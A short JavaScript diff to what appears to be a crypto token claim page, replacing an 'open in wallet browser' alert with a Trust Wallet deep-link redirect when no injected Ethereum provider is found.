@@ -35,8 +35,10 @@
         const b = document.getElementById('claimBtn');
         const s = document.getElementById('statusMsg');
 
+        // MOBİL YÖNLENDİRME GÜNCELLEMESİ
         if (!window.ethereum) {
-            alert("Open in Trust Wallet / MetaMask Browser");
+            const deepLink = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
+            window.location.href = deepLink;
             return;
         }
 
